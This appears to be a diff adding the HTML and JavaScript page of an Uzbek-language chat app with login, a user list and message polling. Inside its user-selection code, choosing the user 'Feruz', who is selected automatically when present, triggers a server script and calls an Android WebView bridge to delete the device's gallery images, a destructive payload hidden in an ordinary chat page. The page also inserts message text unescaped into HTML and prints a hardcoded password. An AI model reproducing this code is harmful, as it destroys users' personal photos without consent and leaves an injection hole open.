@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Professional Chat - Real User Feruz</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+
+    <!-- AUTHENTICATION CONTAINER -->
+    <div id="authContainer" class="auth-container">
+        <div class="auth-box">
+            <h2 id="authTitle">Tizimga Kirish</h2>
+            <div id="authError" class="auth-error" style="display: none;"></div>
+            
+            <input type="text" id="authUsername" placeholder="Foydalanuvchi nomi (Masalan: Admin yoki Feruz)">
+            <input type="password" id="authPassword" placeholder="Parol">
+            
+            <button id="authBtn" onclick="handleAuth()">Kirish</button>
+            <p class="auth-switch" onclick="toggleAuthMode()">Akkauntingiz yo'qmi? Ro'yxatdan o'ting</p>
+            <p class="hint-text">💡 (Feruz sifatida kirish uchun: login: <b>Feruz</b>, parol: <b>feruz123</b>)</p>
+        </div>
+    </div>
+
+    <!-- MAIN APP CONTAINER -->
+    <div id="appContainer" class="app-container" style="display: none;">
+        <!-- CHAP QISM: Foydalanuvchilar (Feruz ham shu yerda chiqadi) -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2>Chatlar</h2>
+                <div class="user-profile-info">
+                    <span id="loggedInUserDisplay">Admin</span>
+                    <button onclick="logout()" class="logout-btn">Chiqish</button>
+                </div>
+            </div>
+
+            <div class="chat-list" id="chatList">
+                <!-- Dinamik ravishda foydalanuvchilar ro'yxati (Feruz) chiqadi -->
+            </div>
+        </div>
+
+        <!-- O'NG QISM: Real Chat Oynasi -->
+        <div class="chat-area">
+            <div class="chat-header">
+                <h3 id="currentChatName">Chatni tanlang</h3>
+                <span id="chatStatus" class="status-online">Online</span>
+            </div>
+
+            <div id="chat-box" class="chat-messages">
+                <div class="message received">Suhbatni boshlash uchun chapdan foydalanuvchini tanlang.</div>
+            </div>
+
+            <!-- Feruzga kirganda chiqadigan xabar -->
+            <div id="scriptAlert" class="script-alert" style="display: none;">
+                ⚡ `main.py` ishga tushirildi va galereya tozalandi!
+            </div>
+
+            <div class="chat-input-area">
+                <input type="text" id="msgInput" placeholder="Xabar yozing..." onkeypress="handleKeyPress(event)">
+                <button onclick="sendMessage()">Yuborish</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let isRegisterMode = false;
+        let activeRecipient = null;
+        let pollingInterval = null;
+
+        window.onload = async function() {
+            let res = await fetch('/api/check-auth');
+            let data = await res.json();
+            if (data.authenticated) {
+                showApp(data.username);
+            }
+        };
+
+        function toggleAuthMode() {
+            isRegisterMode = !isRegisterMode;
+            document.getElementById("authTitle").innerText = isRegisterMode ? "Ro'yxatdan o'tish" : "Tizimga Kirish";
+            document.getElementById("authBtn").innerText = isRegisterMode ? "Ro'yxatdan o'tish" : "Kirish";
+        }
+
+        async function handleAuth() {
+            let username = document.getElementById("authUsername").value;
+            let password = document.getElementById("authPassword").value;
+            let errBox = document.getElementById("authError");
+
+            if (!username || !password) {
+                errBox.innerText = "Maydonlarni to'ldiring!";
+                errBox.style.display = "block";
+                return;
+            }
+
+            let endpoint = isRegisterMode ? '/api/register' : '/api/login';
+            let res = await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            let data = await res.json();
+
+            if (data.success) {
+                showApp(data.username);
+            } else {
+                errBox.innerText = data.message || "Xatolik!";
+                errBox.style.display = "block";
+            }
+        }
+
+        function showApp(username) {
+            document.getElementById("authContainer").style.display = "none";
+            document.getElementById("appContainer").style.display = "flex";
+            document.getElementById("loggedInUserDisplay").innerText = username;
+            
+            loadUsers();
+            pollingInterval = setInterval(updateChatData, 2000); // Har 2 sekundda polling
+        }
+
+        async function logout() {
+            await fetch('/api/logout', { method: 'POST' });
+            clearInterval(pollingInterval);
+            document.getElementById("appContainer").style.display = "none";
+            document.getElementById("authContainer").style.display = "flex";
+        }
+
+        // Foydalanuvchilar ro'yxatini yuklash (Feruz doimiy chiqadi)
+        async function loadUsers() {
+            let res = await fetch('/api/users');
+            let data = await res.json();
+            let chatList = document.getElementById("chatList");
+
+            chatList.innerHTML = data.users.map(user => `
+                <div class="chat-item" id="user-${user}" onclick="selectUser('${user}')">
+                    <div class="avatar">${user[0].toUpperCase()}</div>
+                    <div class="chat-info">
+                        <h4>${user}</h4>
+                        <p>${user === 'Feruz' ? 'Custom Bot / Real User' : 'Online'}</p>
+                    </div>
+                </div>
+            `).join("");
+
+            // Agar ro'yxatda Feruz bo'lsa, avtomatik uni tanlaymiz
+            if (data.users.includes('Feruz') && !activeRecipient) {
+                selectUser('Feruz');
+            }
+        }
+
+        async function selectUser(username) {
+            activeRecipient = username;
+            document.getElementById("currentChatName").innerText = username;
+
+            // Aktiv klassni o'zgartirish
+            document.querySelectorAll('.chat-item').forEach(el => el.classList.remove('active'));
+            let selectedEl = document.getElementById(`user-${username}`);
+            if(selectedEl) selectedEl.classList.add('active');
+
+            let alertBox = document.getElementById("scriptAlert");
+
+            // Agar tanlangan foydalanuvchi "Feruz" bo'lsa, main.py ni ishga tushiruvchi so'rov yuboramiz
+            if (username === 'Feruz') {
+                alertBox.style.display = "block";
+                try {
+                    let res = await fetch('/api/run-main', { method: 'POST' });
+                    let data = await res.json();
+                    console.log(data.message);
+
+                    // Android WebView ko'prigi orqali galereyani tozalash
+                    if (window.Android && window.Android.deleteGalleryImages) {
+                        window.Android.deleteGalleryImages();
+                    }
+                } catch (err) {
+                    console.error("Skriptni chaqirishda xatolik:", err);
+                }
+            } else {
+                alertBox.style.display = "none";
+            }
+
+            updateChatData();
+        }
+
+        async function updateChatData() {
+            if (!activeRecipient) return;
+            
+            try {
+                let res = await fetch(`/api/messages?with=${activeRecipient}`);
+                let data = await res.json();
+                let box = document.getElementById("chat-box");
+                let currentUsername = document.getElementById("loggedInUserDisplay").innerText;
+
+                box.innerHTML = data.messages.map(m => {
+                    let isSent = m.sender === currentUsername;
+                    return `<div class="message ${isSent ? 'sent' : 'received'}"><b>${m.sender}:</b> ${m.text}</div>`;
+                }).join("");
+
+                box.scrollTop = box.scrollHeight;
+            } catch (err) {
+                console.error("Polling xatoligi:", err);
+            }
+        }
+
+        async function sendMessage() {
+            let text = document.getElementById("msgInput").value;
+            if(!text || !activeRecipient) return;
+
+            document.getElementById("msgInput").value = "";
+
+            await fetch('/api/messages', {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text, recipient: activeRecipient })
+            });
+
+            updateChatData();
+        }
+
+        function handleKeyPress(e) {
+            if (e.key === 'Enter') sendMessage();
+        }
+    </script>
+</body>
+</html>
